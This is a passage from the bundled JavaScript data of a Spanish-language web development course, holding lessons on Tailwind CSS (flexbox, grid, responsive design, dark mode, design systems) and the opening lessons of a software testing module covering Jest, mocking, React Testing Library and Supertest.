espacio arriba y abajo, qu clases usaras combinando `px` y `py`?\n",completed:!1},{id:"tailwind-junior-flexbox",title:"Flexbox con Tailwind",level:"junior",content:`# Leccin 7: Flexbox con Tailwind

Flexbox es la herramienta ms usada para crear layouts unidimensionales. En Tailwind es extremadamente intuitivo.

## 1. Activando Flexbox

Se usa la clase \`flex\`. Por defecto, los elementos se ponen uno al lado del otro (\`flex-row\`).

## 2. Direccin

*   \`flex-row\`: Horizontal (por defecto).
*   \`flex-col\`: Vertical.
*   \`flex-row-reverse\` / \`flex-col-reverse\`: Invierte el orden.

## 3. Alineacin (Eje Principal)

*   \`justify-start\`: Al principio.
*   \`justify-center\`: Centrado.
*   \`justify-end\`: Al final.
*   \`justify-between\`: Espacio mximo entre elementos.

## 4. Alineacin (Eje Secundario)

*   \`items-start\`: Arriba.
*   \`items-center\`: Centrado verticalmente.
*   \`items-end\`: Abajo.
*   \`items-stretch\`: Estirar (por defecto).

## 5. Gap (Eje X e Y)

En lugar de usar \`space-x\`, modernamente usamos \`gap\`:
*   \`gap-4\`: Espacio uniforme entre todos los hijos.
*   \`gap-x-4\`: Solo horizontal.
*   \`gap-y-8\`: Solo vertical.

---

## Mini Ejercicio
Cmo centraras un icono dentro de un crculo div perfecto usando Flexbox y Tailwind? (Pista: necesitas centrar en ambos ejes).
`,completed:!1},{id:"tailwind-junior-grid",title:"Grid con Tailwind",level:"junior",content:`# Leccin 8: Grid con Tailwind

CSS Grid es ideal para layouts bidimensionales complejos (filas y columnas al mismo tiempo).

## 1. Activando el Grid

Se usa la clase \`grid\`.

## 2. Definiendo Columnas (\`grid-cols-{n}\`)

*   \`grid-cols-2\`: Crea 2 columnas iguales.
*   \`grid-cols-12\`: El estndar sistema de 12 columnas.
*   \`grid-cols-none\`: Desactiva las columnas explcitas.

## 3. Espaciado (Gap)

Igual que en Flexbox, usamos \`gap-{size}\` para separar las celdas.

## 4. Combinando Celdas (Col Span y Row Span)

A veces quieres que un elemento ocupe ms de una columna:
*   \`col-span-2\`: El elemento ocupa dos columnas.
*   \`col-span-full\`: El elemento ocupa todo el ancho disponible.
*   \`row-span-3\`: El elemento ocupa tres filas.

## 5. Control de Filas

*   \`grid-rows-{n}\`: Define el nmero de filas.
*   \`grid-flow-col\`: Hace que los elementos se posicionen en columnas automticamente en lugar de filas.

---

## Mini Ejercicio
Si tienes un contenedor con \`grid-cols-3\` y quieres que la cabecera arriba ocupe todo el ancho, qu clase de \`col-span\` le pondras a esa cabecera?
`,completed:!1},{id:"tailwind-junior-responsive",title:"Diseo Responsivo (Mobile First)",level:"junior",content:`# Leccin 9: Diseo Responsivo (Mobile First)

En Tailwind, no usas Media Queries en CSS. Usas **prefijos** en tus clases. La filosofa es **Mobile-First**: los estilos base son para el celular, y agregas prefijos para pantallas ms grandes.

## 1. Los Breakpoints por defecto

*   **Sin prefijo:** Celular (< 640px).
*   **\`sm:\`**: Tablet pequea (640px).
*   **\`md:\`**: Tablet / Laptop vieja (768px).
*   **\`lg:\`**: Laptop moderna (1024px).
*   **\`xl:\`**: Monitor Pro (1280px).
*   **\`2xl:\`**: Pantallas gigantes (1536px).

## 2. Cmo aplicarlo

\`\`\`html
<!-- Ancho completo en mvil, mitad en tablet, un tercio en laptop -->
<div class="w-full md:w-1/2 lg:w-1/3">
  Contenido
</div>
\`\`\`

## 3. Cambiando cualquier propiedad

Puedes aplicar breakpoints a **cualquier** clase:
*   \`text-center md:text-left\`: Centrado en mvil, a la izquierda en tablet.
*   \`hidden md:block\`: Oculto en mvil, visible en tablet.
*   \`bg-red-500 lg:bg-blue-500\`: Rojo en mvil, azul en pantallas grandes.

## 4. Error Comn: Pensar en rangos

En Tailwind, \`md:text-blue-500\` significa: "Aplica azul desde 768px **en adelante**". Si quieres que algo sea azul solo en tablet pero rojo en laptop, debes sobrescribirlo: \`md:bg-blue-500 lg:bg-red-500\`.

---

## Mini Ejercicio
Cmo haras para que un contenedor tenga 1 columna en mvil, 2 en tablet (\`md\`) y 4 en pantallas grandes (\`lg\`) usando Grid?
`,completed:!1},{id:"tailwind-junior-estados",title:"Hover, Focus y Otros Estados",level:"junior",content:`# Leccin 10: Hover, Focus y Otros Estados

Tailwind permite manejar estados interactivos con prefijos similares a los de responsive.

## 1. Hover (Pasar el ratn)

Se usa el prefijo \`hover:\`.
\`\`\`html
<button class="bg-blue-500 hover:bg-blue-700">
  Botn Interactivo
</button>
\`\`\`

## 2. Focus (Al seleccionar con teclado)

Ideal para inputs y accesibilidad. Se usa el prefijo \`focus:\`.
\`\`\`html
<input class="border-gray-300 focus:border-blue-500 focus:ring-2" />
\`\`\`

## 3. Active (Al hacer click)

Se usa el prefijo \`active:\`. til para dar feedback visual de presin.

## 4. Group Hover (Efectos combinados)

Si quieres que al pasar el mouse por un contenedor cambie un elemento hijo:
1.  Agregas \`group\` al padre.
2.  Agregas \`group-hover:clase\` al hijo.

\`\`\`html
<div class="group p-4 bg-white hover:bg-black">
  <p class="text-black group-hover:text-white">Este texto cambia con el padre</p>
</div>
\`\`\`

## 5. Peer States (Hermanos)

Permite cambiar un elemento basado en el estado de su hermano anterior (muy til para checkboxes o validacin de formularios) usando la clase \`peer\` y el prefijo \`peer-checked:\`, \`peer-focus:\`, etc.

---

## Mini Ejercicio
Crea un botn que sea de color azul claro (\`bg-blue-400\`), pero que al pasar el mouse sea azul oscuro (\`bg-blue-800\`) y que al hacer click se vuelva todava ms oscuro (\`bg-blue-950\`).
`,completed:!1},{id:"tailwind-junior-buenas-practicas",title:"Buenas Prcticas Bsicas",level:"junior",content:`# Leccin 11: Buenas Prcticas Bsicas

Escribir muchas clases en una sola lnea puede volverse catico. Aqu te enseamos cmo mantener tu proyecto profesional.

## 1. No abuses de \`@apply\`

Tailwind tiene una directiva llamada \`@apply\` que permite copiar clases al CSS tradicional.
*    **MAL:** Hacerlo para todo. Pierdes la ventaja de no tener que inventar nombres de clases.
*    **BIEN:** Solo para cosas extremadamente repetitivas, como un reset base para botones muy especficos.

## 2. Componentes al rescate

Si ests usando React, Vue o cualquier framework de componentes, **no copies y pegues clases**. Crea un componente.

\`\`\`tsx
//  BIEN: Lgica de reutilizacin en React
const Button = ({ children }) => (
  <button className="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition-colors">
    {children}
  </button>
);
\`\`\`

## 3. Orden de Clases Consistente

Te recomendamos este orden mental:
1.  Layout (flex, grid, block)
2.  Posicin (relative, absolute)
3.  Tamao (w-10, h-10)
4.  Espaciado (p-4, m-2)
5.  Tipografa (text-lg, font-bold)
6.  Visual (bg-red, shadow, border)
7.  Interactividad (hover:, group:)
8.  Responsive (md:, lg:)

*Tip: Existe un plugin oficial de Prettier que ordena las clases por ti automticamente.*

## 4. Usa valores arbitrarios solo cuando sea necesario

Si necesitas una medida exacta que no est en la escala de Tailwind:
*   \`w-[13.5px]\` o \`bg-[#ff5500]\`.
Intenta evitarlos y usar los valores de la escala para mantener la armona visual.

---

## Proyecto Final Junior
Crea una **Tarjeta de Perfil Responsiva**:
1.  Un contenedor con sombra y bordes redondeados.
2.  Imagen de perfil circular a la izquierda (en desktop) o arriba (en mvil).
3.  Nombre en negrita y descripcin en gris.
4.  Un botn de "Seguir" que cambie de color al pasar el mouse.
5.  Usa Flexbox o Grid para alinear los elementos correctamente.

Felicidades! Ahora dominas las bases de Tailwind CSS. 
`,completed:!1},{id:"tailwind-junior-ejercicios",title:"Ejercicios Prcticos: Tailwind CSS Junior",level:"junior",content:`# Ejercicios Prcticos: Tailwind CSS Junior

Pon a prueba tu habilidad para maquetar interfaces modernas usando solo clases de utilidad. Recuerda: el objetivo es no escribir ni una sola lnea de CSS tradicional.

---

## 1. Tarjeta de Producto (E-commerce)
**Objetivo:** Dominar sombras, bordes, espaciado y tipografa.

**Consigna:**
Crea una tarjeta de producto que contenga:
*   Una imagen de producto en la parte superior.
*   Una etiqueta de "Nuevo" o "Oferta" flotando sobre la imagen (usa \`absolute\`).
*   Ttulo del producto en negrita.
*   Precio resaltado en un color llamativo (ej. \`text-indigo-600\`).
*   Un botn de "Aadir al carrito" que cambie de color al pasar el mouse (\`hover\`).
*   **Detalle:** La tarjeta debe tener una sombra suave (\`shadow-md\`) que aumente al pasar el mouse.

---

## 2. Navbar Minimalista y Responsiva
**Objetivo:** Practicar \`flexbox\`, alineacin y diseo responsivo (\`md:\`).

**Consigna:**
Disea una barra de navegacin que:
*   Tenga un logo a la izquierda y enlaces a la derecha.
*   En pantallas mviles, los enlaces deben estar ocultos (\`hidden\`) y mostrar un icono de men.
*   En pantallas medianas (\`md\`) y superiores, desaparece el icono de men y se muestran los enlaces.
*   La barra debe ser \`sticky\` (quedarse fija arriba al hacer scroll) y tener un fondo con desenfoque (\`backdrop-blur\`).

---

## 3. Seccin "Hero" de Landing Page
**Objetivo:** Combinar layout, tipografa gigante y botones de accin.

**Consigna:**
Crea la seccin principal de una web:
*   Un fondo con un degradado suave (\`bg-gradient-to-r\`).
*   Un ttulo principal gigante y centrado (\`text-5xl\` o superior).
*   Un subttulo que explique el producto.
*   Dos botones: uno principal (color slido) y uno secundario (solo borde/outline).
*   **Desafo:** Asegrate de que el texto no toque los bordes de la pantalla en mviles usando un padding lateral adecuado.

---

## 4. Formulario de Registro Estilizado
**Objetivo:** Manejar estados de \`focus\`, bordes y redondeados.

**Consigna:**
Disea un formulario que incluya:
*   Inputs con etiquetas (\`label\`) arriba.
*   Los inputs deben tener un borde sutil que se vuelva azul y brille al hacer click (\`focus:ring\`).
*   Un checkbox para "Acepto trminos y condiciones".
*   Un botn de "Crear cuenta" que ocupe todo el ancho (\`w-full\`).
*   **Detalle:** Agrega un icono pequeo dentro del input de email (puedes usar una imagen o un emoji).

---

## 5. Dashboard Sidebar (Ejercicios de Grid)
**Objetivo:** Crear una estructura de panel de control.

**Consigna:**
Crea un layout de dashboard que use \`grid\`:
*   Una barra lateral fime (sidebar) con iconos y texto.
*   Un rea de contenido principal a la derecha.
*   **Desafo:** En mviles, la sidebar debe desaparecer y mostrarse solo el contenido, o moverse a la parte inferior.
*   Dentro del contenido, crea 3 tarjetas pequeas con "Estadsticas" (ej. "Usuarios Totales: 1,200") alineadas usando Flexbox.

---

A maquetar! Tailwind es como jugar con Legos: una vez que conoces las piezas, puedes construir cualquier cosa. 
`,completed:!1,isProject:!0},{id:"tailwind-junior-evaluacion",title:"Evaluacin Tailwind CSS Junior",level:"junior",content:'# Evaluacin Final: Tailwind CSS Junior\n\nDemuestra que dominas la mentalidad utility-first y el maquetado responsivo bsico.\n\n## 1. Examen Terico\n*   Cul es la diferencia entre `p-4` y `m-4`?\n*   Qu significa que Tailwind sea "Mobile-First"?\n*   Para qu sirve el archivo `tailwind.config.js`?\n\n## 2. Desafo Prctico: Perfil de Usuario\nCrea un componente `UserCard` que:\n1. Tenga una imagen circular centrada.\n2. Un ttulo con fuente negrita y tamao `text-xl`.\n3. Use un color de fondo sutil (ej: `bg-slate-50`).\n4. Sea responsivo: texto centrado en mviles y alineado a la izquierda en tablets (`md`).\n\n## 3. Criterios de Aprobacin\n* [ ] Uso exclusivo de utilidades de Tailwind (sin CSS externo).\n* [ ] Implementacin exitosa de al menos un breakpoint (`sm`, `md` o `lg`).\n* [ ] Diseo visualmente limpio y equilibrado.\n',completed:!1,isProject:!0},{id:"tailwind-semi-senior-configuracion-avanzada",title:"Configuracin Avanzada y Design Tokens",level:"semi-senior",content:`# Leccin 12: Configuracin Avanzada y Design Tokens

A nivel Semi-Senior, dejas de usar los valores por defecto de Tailwind para implementar el **Sistema de Diseo (Design System)** de tu marca o cliente.

## 1. El Objeto \`theme\`
En \`tailwind.config.js\`, la seccin \`theme\` es donde defines la "verdad nica" de tu diseo.

*   \`theme\`: **Sobrescribe** los valores por defecto de Tailwind.
*   \`theme.extend\`: **Agrega** o modifica valores sin perder los de fbrica.

\`\`\`javascript
// tailwind.config.js
module.exports = {
  theme: {
    extend: {
      colors: {
        brand: {
          light: '#3fbaeb',
          DEFAULT: '#0fa9e6',
          dark: '#0c87b8',
        },
      },
      spacing: {
        '128': '32rem',
      }
    }
  }
}
\`\`\`

## 2. Design Tokens
Un Design Token es una variable que representa una decisin de diseo (color, fuente, espaciado). 
**Pro tip:** No nombres tus colores por lo que son (\`blue-500\`), nmbralos por su funcin (\`primary\`, \`secondary\`, \`success\`).

\`\`\`javascript
colors: {
  primary: 'var(--color-primary)', // Usando variables CSS para mayor flexibilidad
  surface: '#ffffff',
}
\`\`\`

## 3. Pantallas Personalizadas
A veces el \`md\` de 768px no encaja con tu diseo. Puedes definir tus propios breakpoints.

\`\`\`javascript
screens: {
  'tablet': '640px',
  'laptop': '1024px',
  'ultra': '1920px',
}
\`\`\`

---

## Mini Ejercicio
Modifica tu configuracin para agregar un color llamado \`accent\` con intensidad \`500\` y salo en un botn.
`,completed:!1},{id:"tailwind-semi-senior-componentizacion",title:"Componentizacin y Manejo de Clases Dinmicas",level:"semi-senior",content:`# Leccin 13: Componentizacin y Manejo de Clases Dinmicas

El mayor problema de Tailwind es el "Class Soup" (sopa de clases). Para solucionarlo, usamos patrones de componentizacin profesional.

## 1. El Problema de la Concatenacin
\`\`\`javascript
//  INCORRECTO: Difcil de leer y propenso a errores
const className = "px-4 py-2 " + (isActive ? "bg-blue-500" : "bg-gray-200");
\`\`\`

## 2. Herramientas Imprescindibles: \`clsx\` y \`tailwind-merge\`
Al trabajar en React, necesitas estas dos libreras:
*   **\`clsx\` / \`classnames\`**: Permite escribir lgica condicional limpia.
*   **\`tailwind-merge\`**: Resuelve conflictos de clases (ejm: si pasas \`p-4\` y \`p-2\`, gana la ltima).

\`\`\`javascript
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';

export function cn(...inputs) {
  return twMerge(clsx(inputs));
}

// Uso: <div className={cn("base-class", isActive && "active-class", className)} />
\`\`\`

## 3. Class Variance Authority (CVA)
El patrn estndar de la industria hoy para crear componentes con variantes (como botones que pueden ser "primary", "outline", "danger").

\`\`\`javascript
const buttonVariants = cva(
  "inline-flex items-center rounded-md font-medium px-4 py-2",
  {
    variants: {
      intent: {
        primary: "bg-blue-600 text-white hover:bg-blue-700",
        outline: "border border-gray-300 text-gray-700 hover:bg-gray-50",
      },
      size: {
        sm: "text-xs px-2",
        md: "text-sm px-4",
      }
    },
    defaultVariants: {
      intent: "primary",
      size: "md",
    }
  }
);
\`\`\`

---

## Mini Ejercicio
Crea un componente \`Badge\` en React que use el patrn \`cn()\` para cambiar su color de fondo basndose en una prop \`type\` ("success" o "error").
`,completed:!1},{id:"tailwind-semi-senior-dark-mode-responsive",title:"Dark Mode y Estrategias Responsivas",level:"semi-senior",content:`# Leccin 14: Dark Mode y Estrategias Responsivas

Implementar un modo oscuro profesional requiere ms que solo invertir colores.

## 1. Activando Dark Mode
Existen dos formas en Tailwind:
1.  **Media (default)**: Basado en las preferencias del sistema operativo.
2.  **Class**: Basado en una clase calculada (ej. \`<html class="dark">\`). Es la ms comn para permitir que el usuario elija con un toggle.

\`\`\`javascript
// tailwind.config.js
module.exports = {
  darkMode: 'class',
  // ...
}
\`\`\`

## 2. Aplicando Estilos
Usas el prefijo \`dark:\`.
\`\`\`html
<div class="bg-white text-black dark:bg-slate-900 dark:text-white">
  Contenido adaptable
</div>
\`\`\`

## 3. Contenedores Responsivos Avanzados
A veces quieres que un elemento mantenga su relacin de aspecto.
*   \`aspect-video\`: 16/9
*   \`aspect-square\`: 1/1
*   \`aspect-[4/3]\`: Personalizado

## 4. El "Container Queries" (El futuro)
A menudo no quieres que un componente cambie segn el ancho de la **pantalla**, sino segn el ancho de su **padre**. Tailwind ofrece un plugin oficial para esto: \`@tailwindcss/container-queries\`.

\`\`\`html
<div class="@container">
  <div class="@lg:grid-cols-3 grid grid-cols-1">
    <!-- Cambia a 3 cols cuando el CONTENEDOR es grande, no la pantalla -->
  </div>
</div>
\`\`\`

---

## Mini Ejercicio
Disea una tarjeta que en modo claro tenga un fondo gris muy suave (\`slate-50\`) y en modo oscuro sea un color gris profundo (\`slate-800\`), cambiando tambin el color del texto.
`,completed:!1},{id:"tailwind-semi-senior-plugins-estados",title:"Plugins y Estados de Interaccin Avanzados",level:"semi-senior",content:`# Leccin 15: Plugins y Estados de Interaccin Avanzados

Tailwind es poderoso, pero a veces necesitas ir ms all de las utilidades estndar.

## 1. Plugins Oficiales que DEBES conocer
Tailwind ofrece plugins para resolver problemas comunes sin ensuciar tu CSS:
1.  **Typography (\`@tailwindcss/typography\`)**: Agrega la clase \`prose\`, ideal para estilizar HTML que viene de un CMS o Markdown.
2.  **Forms (\`@tailwindcss/forms\`)**: Resetea los estilos de los inputs para que sean fciles de personalizar.
3.  **Aspect Ratio**: Si no usas la versin ms nueva de CSS.
4.  **Line Clamp**: Para truncar textos a N lneas.

## 2. Creando tus propios Plugins
Puedes agregar tus propias utilidades o "base styles" directamente en la config.

\`\`\`javascript
const plugin = require('tailwindcss/plugin')

module.exports = {
  plugins: [
    plugin(function({ addUtilities }) {
      addUtilities({
        '.text-shadow': {
          textShadow: '2px 2px 4px rgba(0,0,0,0.1)',
        },
      })
    })
  ]
}
\`\`\`

## 3. Estados Complejos y Pseudo-clases
*   **\`autofill:\`**: Estilos cuando el navegador autocompleta un campo.
*   **\`file:\`**: Estilos para el botn de "Elegir archivo" en un input file.
*   **\`marker:\`**: Estilos para los puntos o nmeros de una lista \`<ul>\` o \`<ol>\`.
*   **\`selection:\`**: Color de fondo cuando seleccionas texto con el mouse.

## 4. Estilos basados en Atributos
Puedes usar \`data-attributes\` para cambiar estilos desde JavaScript sin cambiar clases.
\`\`\`html
<div data-active="true" class="data-[active=true]:bg-green-500"> ... </div>
\`\`\`

---

## Proyecto Semi-Senior Final
Crea una **Navbar con Dropdown** que:
1.  Use \`dark mode\`.
2.  Tenga un men desplegable que aparezca con una animacin suave usando \`group-hover\`.
3.  Est construida con el patrn de componentes (usando \`cn\` o \`clsx\`).
4.  Implemente configuraciones personalizadas en el \`tailwind.config\`.

Excelente trabajo! Ests a un paso de la maestra total. 
`,completed:!1},{id:"tailwind-semi-senior-evaluacion",title:"Evaluacin Tailwind CSS Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: Tailwind CSS Semi-Senior

Enfocada en mantenibilidad, componentizacin y personalizacin del sistema.

## 1. Examen Terico
*   Por qu es una mala prctica abusar de la directiva \`@apply\`?
*   Cmo resolveras un conflicto de clases ("class collision") en React?
*   Explica cmo funciona la estrategia de \`class\` para el Dark Mode.

## 2. Desafo Prctico: Sistema de Variantes
Crea un componente \`Button\` que acepte una prop \`variant\` ("primary", "secondary", "danger").
1. Cada variante debe tener sus propios colores de fondo y hover.
2. Usa la funcin \`cn\` (clsx + tailwind-merge) para combinar las clases.
3. El botn debe ser compatible con Dark Mode.

## 3. Criterios de Aprobacin
* [ ] Cdigo organizado y sin repeticin innecesaria de clases ("DRY").
* [ ] Correcta implementacin de lgica condicional para estilos.
* [ ] Uso de configuracin personalizada en el \`theme\`.
`,completed:!1,isProject:!0},{id:"tailwind-senior-senior-design-systems",title:"Tailwind en Sistemas de Diseo a Gran Escala",level:"senior",content:`# Leccin 16: Tailwind en Sistemas de Diseo a Gran Escala

A nivel Senior, Tailwind no es solo una herramienta de estilado, es el motor de tu **Design System**. En aplicaciones con cientos de componentes, la consistencia y la escalabilidad son crticas.

## 1. Abstraccin del Token
Un error Senior comn es exponer las clases de Tailwind directamente en componentes de negocio.
*    **Mal**: \`<div className="bg-blue-500 p-4">\` en un componente de \`Facturacin\`.
*    **Bien**: Crear componentes base atmicos (Atom) que encapsulan Tailwind y exponer solo propiedades lgicas.

## 2. Configuracin Compartida (Preset)
Si manejas mltiples repositorios (ej. una Web, un Dashboard y una App mvil con React Native), no repites la configuracin. Usas un **Preset**.

\`\`\`javascript
// company-preset.js
module.exports = {
  theme: {
    extend: {
      colors: {
        brand: '#ff5a5f',
      },
    },
  },
  plugins: [require('@tailwindcss/typography')],
}

// tailwind.config.js de cada proyecto
module.exports = {
  presets: [require('./company-preset.js')],
  // ... configuracin especfica local
}
\`\`\`

## 3. Performance y Bundle Size
Tailwind es rpido porque genera CSS esttico, pero si usas demasiadas variantes o colores arbitrarios (\`-[...]\`), el archivo generado puede crecer.
*   **JIT (Just-In-Time)**: Entender cmo el motor busca clases en tiempo real.
*   **Safe-listing**: Evita purgar clases que se generan dinmicamente desde una DB.

## 4. Estrategias de Migracin
Cmo migrar un monolito de 10 aos con 50,000 lneas de CSS a Tailwind?
*   **Estrategia de Convivencia**: Usar un \`prefix\` en Tailwind (ej: \`tw-\`) para evitar colisiones con el CSS viejo durante la transicin.
*   **Estrategia de Reemplazo por Capas**: Empezar por el layout y tipografa, dejando los componentes complejos para el final.

---

## Pregunta de Entrevista Senior
**P:** "Cmo manejaras el conflicto de clases cuando un usuario consume tu librera de componentes y quiere sobrescribir un estilo?"
**R:** Implementara un patrn de \`merge\` usando \`tailwind-merge\` dentro de los componentes base para asegurar que las props del usuario tengan prioridad sobre los estilos por defecto sin duplicar utilidades.
`,completed:!1},{id:"tailwind-senior-evaluacion",title:"Evaluacin Tailwind CSS Senior",level:"senior",content:`# Evaluacin Final: Tailwind CSS Senior

Orientada a la arquitectura, performance y liderazgo tcnico.

## 1. Diseo de Arquitectura
*   Describe cmo estructuraras los Tailwind Presets para un sistema de micro-frontends de una empresa con 3 marcas diferentes que comparten la misma base de diseo pero usan colores y fuentes distintas.

## 2. Diagnstico de Performance
*   Un desarrollador reporta que el archivo CSS generado pesa 4MB. Qu buscaras en la configuracin o en el cdigo para reducir este tamao sin perder funcionalidades?

## 3. Desafo Real: Migracin Segura
*   Cmo introduciras Tailwind en un proyecto que ya usa **SASS con CSS Modules** sin romper la interfaz actual? Disea un plan de 3 pasos.

## 4. Criterios de Aprobacin
* [ ] Justificacin tcnica slida basada en tradeoffs.
* [ ] Enfoque en escalabilidad (manejo de presets, plugins, capas).
* [ ] Conocimiento de las herramientas de optimizacin (Purge, JIT).
`,completed:!1,isProject:!0}]},Yx={id:"testing",title:"Testing y Calidad de Software",description:"Aprende a escribir cdigo confiable, desde pruebas unitarias hasta estrategias de despliegue continuo.",completed:!1,lessons:[{id:"testing-01-intro-testing",title:"Introduccin al Testing - El Robot que revisa tu cdigo",level:"junior",content:`# Leccin 01: Introduccin al Testing - El Robot que revisa tu cdigo

Alguna vez te pas que arreglaste un error en tu cdigo y, sin querer, rompiste algo que ya funcionaba bien? El testing est aqu para que eso no te pase nunca ms.

## 1. Qu es el Testing?
Imagina que construiste un juguete. Antes de regalrselo a un nio, lo sacudes para ver si se le caen las piezas. Eso es testear. En programacin, escribimos cdigo para probar nuestro cdigo.

## 2. Testing Manual vs Automtico
*   **Manual:** T abres la web, haces clic y rezas para que funcione. Es lento y te puedes olvidar de cosas.
*   **Automtico:** Un robot (un programa) lo hace por ti en segundos. Lo puede hacer mil veces al da y nunca se cansa ni se olvida de nada.

## 3. Por qu importa (Incluso siendo Junior)
1. **Confianza:** Si los tests estn en verde, puedes estar tranquilo.
2. **Documentacin:** Un test te dice qu se supone que tiene que hacer una funcin.
3. **Calidad:** Te obliga a pensar mejor cmo escribir tu cdigo.

---

### Concepto Junior:
El testing no es "perder tiempo", es **ahorrar tiempo** a futuro. Es mejor detectar un error ahora en tu computadora que maana cuando el cliente lo vea.
`,completed:!1},{id:"testing-02-tipos-de-testing",title:"Tipos de Pruebas (La Pirmide)",level:"junior",content:`# Leccin 02: Tipos de Pruebas (La Pirmide)

No todos los tests prueban lo mismo. Segn cuntas piezas estemos revisando, les ponemos un nombre diferente.

## 1. Unit Testing (Pruebas Unitarias)
Son como probar cada ladrillo de una casa. Prueban una sola funcin o pedacito de cdigo solo.
*   **Ejemplo:** Probar que la funcin \`sumar(2, 2)\` devuelva \`4\`.
*   **Velocidad:** Muy rpidas.

## 2. Integration Testing (Pruebas de Integracin)
Son como probar que los ladrillos encajen bien entre s para formar una pared. Prueban cmo interactan dos partes.
*   **Ejemplo:** Probar que cuando guardas un usuario, se guarde bien en la base de datos.

## 3. E2E Testing (Pruebas de punta a punta)
Son como entrar a la casa terminada y probar si el timbre suena. Prueban el sistema completo como lo vera el usuario.
*   **Ejemplo:** Un robot entra a tu web, se loguea y compra un producto.

---

### La Regla de Oro:
Debes tener **muchos** unit tests, **algunos** de integracin y **poquitos** E2E. A esto se le llama la **Pirmide de Testing**.
`,completed:!1},{id:"testing-03-herramientas-y-primer-test",title:"Tu primer test con Jest / Vitest",level:"junior",content:`# Leccin 03: Tu primer test con Jest / Vitest

Vamos a ver cmo se escribe un test real en el lenguaje que usamos todos los das: JavaScript.

## 1. Herramientas: Jest y Vitest
Son los programas que corren nuestros tests. Se usan en casi todas las empresas del mundo y se escriben muy parecido.

## 2. Conceptos: Expect y Assert
En un test siempre decimos: "Espero que esto sea igual a aquello".
*   **Expect:** Es la palabra que usamos para decir "Mir este resultado".
*   **Assert:** Es lo que afirmamos que debe pasar.

## 3. Ejemplo Real
Imagina una funcin en \`calculo.js\`:
\`\`\`javascript
export function duplicar(n) { return n * 2; }
\`\`\`

Tu test en \`calculo.test.js\`:
\`\`\`javascript
import { duplicar } from './calculo';

test('debe duplicar el numero 5', () => {
    // 1. Ejecuto (obtengo el resultado)
    const resultado = duplicar(5);
    
    // 2. Espero (afirmo lo que quiero)
    expect(resultado).toBe(10);
});
\`\`\`

### Cmo se lee esto?
\`test('descripcin', () => { expect(resultado).toBe(valor_esperado); });\`

---

### Misin Junior:
Fjate que \`toBe(10)\` es donde decimos qu esperamos. Si maana cambias la funcin y devuelve 11, el test se pondr rojo y te avisar que algo sali mal. Es tu red de seguridad!
`,completed:!1},{id:"testing-04-unit-testing-profundo",title:"Unit Testing Profundo y Mocking",level:"semi-senior",content:`# Leccin 04: Unit Testing Profundo y Mocking

Como Semi-Senior, ya no solo testeas funciones matemticas simples. Debes enfrentar dependencias externas, efectos secundarios y lgica compleja. Aqu el **Mocking** es tu mejor amigo.

## 1. Mocks vs Spies
*   **Mocks (\`jest.fn()\`):** Reemplazan una funcin real con una versin "de mentira" que puedes controlar.
*   **Spies (\`jest.spyOn()\`):** Observan una funcin real sin reemplazarla por completo, permitindote saber cuntas veces se llam y con qu argumentos.

## 2. El Arte del Mocking de Mdulos
Imagina un servicio que enva un Email. No queremos enviar un email real en cada test.
\`\`\`javascript
import { sendEmail } from './emailService';
import { processOrder } from './orderProcessor';

jest.mock('./emailService'); // El mdulo ahora es un Mock

test('debe enviar un email cuando la orden se procesa', async () => {
    await processOrder({ id: 1 });
    expect(sendEmail).toHaveBeenCalledTimes(1);
});
\`\`\`

## 3. Coverage (Cobertura de Cdigo)
La cobertura te dice qu porcentaje de tu cdigo est siendo ejecutado por los tests.
*   **Statement Coverage:** Pasamos por todas las lneas?
*   **Branch Coverage:** Probamos tanto el \`if\` como el \`else\`?
**Ojo:** Un 100% de coverage no significa que tu app no tenga bugs, solo significa que los tests pasaron por todas las lneas.

---

### Buenas Prcticas de Organizacin:
1.  **Describe/It:** Agrupa por contexto.
2.  **Setup/Teardown:** Usa \`beforeEach\` para resetear estados y \`afterAll\` para cerrar conexiones.
3.  **Independencia:** Un test NO debe depender del resultado de otro.
`,completed:!1},{id:"testing-05-react-testing",title:"Testing de Componentes y Hooks en React",level:"semi-senior",content:`# Leccin 05: Testing de Componentes y Hooks en React

En el frontend moderno, el testing se basa en el comportamiento del usuario. Usamos **React Testing Library (RTL)** como estndar.

## 1. Testing de Componentes (RTL)
En lugar de testear variables internas, testeamos lo que el usuario ve.
\`\`\`javascript
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('el formulario de registro muestra error con email invlido', async () => {
  render(<RegistrationForm />);
  const emailInput = screen.getByLabelText(/email/i);
  const submitBtn = screen.getByRole('button', { name: /enviar/i });

  await userEvent.type(emailInput, 'correo-invalido');
  await userEvent.click(submitBtn);

  expect(screen.getByText(/formato de email incorrecto/i)).toBeInTheDocument();
});
\`\`\`

## 2. Testing de Hooks Personalizados
Los hooks no se pueden testear como funciones normales porque necesitan el ciclo de vida de React. Para eso usamos \`renderHook\` de \`@testing-library/react\`.
\`\`\`javascript
import { renderHook, act } from '@testing-library/react';
import { useCounter } from './useCounter';

test('debe incrementar el contador', () => {
  const { result } = renderHook(() => useCounter());
  
  act(() => {
    result.current.increment();
  });

  expect(result.current.count).toBe(1);
});
\`\`\`

## 3. Mock Service Worker (MSW)
Para testear componentes que llaman a APIs, lo mejor es **MSW**. Simula peticiones de red a nivel de navegador, permitiendo que tu cdigo use \`fetch\` real pero reciba respuestas mockeadas.

---

### Regla Semi-Senior:
Si para encontrar un elemento en tu test usas \`container.querySelector('.btn-blue')\`, ests fallando. Usa \`screen.getByRole\` u otros mtodos basados en accesibilidad.
`,completed:!1},{id:"testing-06-api-testing",title:"Testing de APIs con Supertest",level:"semi-senior",content:`# Leccin 06: Testing de APIs con Supertest

En el backend, el Unit Test no es suficiente. Necesitamos verificar que nuestros Endpoints (rutas) respondan correctamente a peticiones HTTP.

## 1. Qu es Supertest?
Es una librera que permite lanzar peticiones HTTP (GET, POST, etc.) a tu aplicacin Express/Node sin necesidad de levantar el servidor realmente en un puerto.

## 2. Ejemplo de integration test de una API
\`\`\`javascript
import request from 'supertest';
import app from '../app';

describe('POST /api/login', () => {
    test('debe devolver 200 y un token con credenciales vlidas', async () => {
        const response = await request(app)
            .post('/api/login')
            .send({
                email: 'test@user.com',
                password: 'password123'
            });

        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('token');
    });

    test('debe devolver 401 con contrasea incorrecta', async () => {
        const response = await request(app)
            .post('/api/login')
            .send({ email: 'test@user.com', password: 'wrong' });

        expect(response.status).toBe(401);
    });
});
\`\`\`

